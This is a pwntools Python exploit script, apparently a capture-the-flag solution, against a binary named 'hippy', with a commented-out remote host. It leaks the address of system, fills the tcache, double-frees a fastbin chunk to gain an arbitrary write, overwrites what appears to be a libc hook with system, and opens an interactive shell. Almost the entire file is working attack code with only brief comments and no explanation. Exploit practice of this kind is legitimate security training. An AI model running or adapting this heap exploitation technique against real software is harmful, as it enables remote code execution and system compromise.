#!/home/sandip/anaconda3/bin/python
from pwn import *

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{1658623}', '-P']

context.binary = binary = './hippy'
# set context to open terminal in split mode


vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)
libc = ELF('./libc.so.6')

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(vuln_elf.path, gdbscript=gs)
    else:
        return process(vuln_elf.path)



p = start()
# p = remote('gc1.eng.run',  31195)

p.recvuntil(b'system: ')
system = p.recvuntil('\n').decode('utf-8')
system = int(system, 16)
# log the system
log.info('system: ' + hex(system))


# allocate 10
for i in range(10):
    p.sendlineafter(': ', b'a')
    p.sendlineafter(': ', str(i))
    p.sendline("/bin/sh\x00")

# Free 9 : 0-6 in tcache 7,8 in fastbin
for i in range(9):
    p.sendlineafter(': ', b'b')
    p.sendlineafter(': ', str(i))


# free 7 again
p.sendlineafter(': ', b'b')
p.sendlineafter(': ', b"7")

# flush tcache
for i in range(7):
    p.sendlineafter(': ', b'a')
    p.sendlineafter(': ', str(i))
    p.sendline("/bin/sh\x00")

# allocate 7
p.sendlineafter(': ', b'a')
p.sendlineafter(': ', b"7")
# p.sendline(p64(0x00007ffff7fabe48)) # fake chunk
p.sendline(p64(system + 0x19CB88)) # fake chunk

# two more fake allocation
p.sendlineafter(': ', b'a')
p.sendlineafter(': ', b"8")
p.sendline(b"YYYYY")

p.sendlineafter(': ', b'a')
p.sendlineafter(': ', b'9')
p.sendline(b"YYYY") 

# arbitrary write
p.sendlineafter(': ', b'a')
p.sendlineafter(': ', b"10")
# p.send(p64(0x7ffff7e0f2c0)) # System
p.send(p64(system)) # System

# p.sendlineafter(': ', b'a')
# p.sendlineafter(': ', b"10")
# p.send() # System


# for i in range(7):
#     p.sendlineafter(': ', b'a\n')
#     p.sendlineafter(': ', str(i)+"\nAAAAAAA\n")

# p.sendlineafter(': ', b'b\n')
# p.sendlineafter(': ', b"7\n")

# p.sendlineafter(': ', b'a\n')
# p.sendlineafter(': ', str(8)+"\n")
# p.send(p64(int("0x1fc9290",16)))
# p.send("AAAAAA\n")

p.interactive()
